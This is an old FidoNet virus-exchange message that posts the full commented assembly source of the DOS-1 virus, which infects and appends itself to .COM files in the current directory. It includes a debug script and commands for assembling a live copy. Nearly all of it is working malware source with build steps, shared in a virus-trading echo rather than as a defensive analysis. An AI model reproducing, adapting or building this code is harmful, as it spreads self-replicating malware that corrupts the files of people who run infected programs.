ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
 Msg  : 18 of 54                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:12 
 To   : -  *.*  -                                           Fri 11 Nov 94 08:10 
 Subj : DOS1.ASM                                                                
ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
.RealName: Max Ivanov
อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
* From : Alan Jones, 2:283/718 (06 Nov 94 16:36)
* To   : Dr T.
* Subj : DOS1.ASM
อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Alan.Jones@f718.n283.z2.fidonet.org
;DOS1 virus by the TridenT research group - Direct Action appending .COM

;This virus infects .COM files in the current directory using FCB's.
;Other than FCB use, the virus is VERY simple.  Avoids infecting misnamed
;EXE files by using an 'M' at the beginning of files to mark infection.

;This virus requires a stub file made from the following debug script,
;to make it, compile the virus, then create the stub file by removing the
;semicolons from the code between the lines, saving it, and calling it
;vstub.hex.  Then use the following commands:

;               Debug <vstub.hex
;               Copy /b vstub.com+dos1.com virus.com

;And you will have a live copy of the DOS-1 virus.  Please be careful
;with it and do not release it.

;-=-=-=-=-=-=-=-=-=-=-=-=-=๐[Begin Debug Script]๐=-=-=-=-=-=-=-=-=-=-=-=-=
;e100 4d eb 6 90 90
;rbx
;0
;rcx
;5
;nvstub.com
;w
;q
;-=-=-=-=-=-=-=-=-=-=-=-=-=๐[End Debug Script]๐=-=-=-=-=-=-=-=-=-=-=-=-=

;Disassembly by Black Wolf

.model tiny
.code
        org     100h
start:
        dec     bp
        nop
        int     20h

HostFile:       ;Not present to preserve original compiler offsets.....

Virus_Entry:
        call    GetOffset
Displacement:
db              'DOS-1',0

GetOffset:
        pop     si
        sub     si,offset Displacement-start
        cld

        mov     di,100h
        push    di                      ;Push DI on stack for ret...

        push    si                      ;Restore host file...
        movsw
        movsw

        pop     si
        lea     dx,[si+VirusDTA-start]  ;set DS:DX = DTA
        call    SetDTA
        mov     ax,1100h                ;Find first filename w/FCB's

FindFirstNext:
        lea     dx,[si+SearchString-start]
        int     21h                       ;Find first/next filename
                          ;using FCB's (*.COM)

        or      al,al                   ;Were any .COM files found?
        jnz     ResetDTA                ;No.... exit virus.

        lea     dx,[si+VirusDTA-start]
        mov     ah,0fh
        int     21h                     ;open .COM file w/FCB

        or      al,al                   ;Successful?
        jnz     FindNextFile            ;No - find another.

        push    dx                      ;Push offset of DTA

        mov     di,dx

        mov     word ptr [di+0Eh],1  ;Set bytes per record to 1
        xor     ax,ax
        mov     [di+21h],ax          ;Set Random Record Num to 0
        mov     [di+23h],ax          ;?

        lea     dx,[si]
        call    SetDTA               ;Set DTA to just before virus
                         ;code in memory - Storage bytes..

        lea     dx,[di]              ;DX = Virus DTA
        mov     ah,27h
        mov     cx,4
        int     21h                  ;Read first 4 bytes w/FCB

        cmp     byte ptr [si],'M'    ;Is it an EXE file or infected?
        je      CloseFile            ;exit...

        mov     ax,[di+10h]          ;AX = Filesize
        mov     [di+21h],ax          ;Set current record to EOF

        cmp     ax,0F800h            ;Is file above F800h bytes?
        ja      CloseFile            ;Too large, exit

        push    ax
        lea     dx,[si]
        call    SetDTA               ;Set DTA to storage bytes/virus.

        lea     dx,[di]
        mov     ah,28h
        mov     cx,end_virus-start
        int     21h                  ;Write virus to end of file.

        xor     ax,ax
        mov     [di+21h],ax          ;Reset file to beginning.
        lea     di,[si]              ;Point DI to DTA

        mov     ax,0E94Dh            ;4dh E9h = marker and jump
        stosw
        pop     ax                   ;AX = jump size
        stosw                        ;Put marker and jump into DTA

        push    dx
        lea     dx,[si]
        call    SetDTA               ;Set DTA for write

        pop     dx
        mov     ah,28h
        mov     cx,4
        int     21h                 ;Write in ID byte 'M' and jump

CloseFile:
        pop     dx

        call    SetDTA
        mov     ah,10h
        int     21h                     ;Close file w/FCB

FindNextFile:
        mov     ah,12h
        jmp     short FindFirstNext     ;Find next file...

ResetDTA:
        mov     dx,80h                  ;80h = default DTA
        call    SetDTA
        retn

SetDTA:
        mov     ah,1Ah
        int     21h                     ;Set DTA to DS:DX
        retn

        db       'MK'                   ;Musad Khafir's signature

SearchString:
        db       0                      ;Default Drive
        db       '????????COM'          ;Search for all .COM files.
end_virus:

        org 1d1h
VirusDTA:
end     start

-+-  FidoPCB v1.4 [NR]
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    þ The MeยeO

TAZOM Assembler  Version 3.2  Copyright (c) 1988, 1992 Borland International

--- Aidstest Null: /Kill
 * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

